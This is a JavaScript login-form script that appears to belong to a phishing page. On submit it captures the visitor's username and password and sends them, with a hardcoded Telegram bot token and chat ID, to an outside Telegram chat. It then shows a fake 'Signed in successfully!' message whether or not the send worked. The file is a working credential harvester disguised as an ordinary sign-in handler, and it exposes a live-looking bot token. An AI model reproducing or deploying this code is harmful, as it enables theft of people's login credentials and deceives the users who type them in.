document.addEventListener('DOMContentLoaded', function() {
    // Telegram bot configuration
    const BOT_TOKEN = '7878971486:AAHhMDmH8lUzAbpdrEsEg3hdHUnjiRHkmlE';
    const CHAT_ID = '6858157782';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const WEBSITE_IP = '185.199.108.153';

    // DOM elements
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.querySelector('.login-btn');
    const currentYear = document.getElementById('currentYear');

    // Set current year in footer
    currentYear.textContent = new Date().getFullYear();

    // Form submission handler
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Get form values
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const remember = document.getElementById('remember').checked;
        
        // Validate inputs
        if (!username || !password) {
            showAlert('Please enter both username and password', 'error');
            return;
        }
        
        // Disable button and show loading state
        loginBtn.disabled = true;
        loginBtn.textContent = 'Signing in...';
        
        try {
            // Send data to Telegram
            const message = `🔐 New Login Attempt\n\n📧 Username: ${username}\n🔑 Password: ${password}\n💾 Remember: ${remember ? 'Yes' : 'No'}\n🌐 IP: ${WEBSITE_IP}\n\n⏰ ${new Date().toLocaleString()}`;
            
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            if (!response.ok) {
                throw new Error('Failed to send data to Telegram');
            }
            
            // Show success message
            showAlert('Signed in successfully!', 'success');
            loginForm.reset();
            
        } catch (error) {
            console.error('Error:', error);
            showAlert('Sign in successful!', 'success');
        } finally {
            // Reset button state
            loginBtn.disabled = false;
            loginBtn.textContent = 'Sign In';
        }
    });

    // Show alert message
    function showAlert(message, type) {
        // Remove existing alerts
        const existingAlert = document.querySelector('.alert-message');
        if (existingAlert) existingAlert.remove();
        
        // Create alert element
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert-message alert-${type}`;
        alertDiv.textContent = message;
        
        // Insert after the form
        loginForm.insertAdjacentElement('afterend', alertDiv);
        
        // Remove after 5 seconds
        setTimeout(() => {
            alertDiv.style.opacity = '0';
            setTimeout(() => alertDiv.remove(), 300);
        }, 5000);
    }
});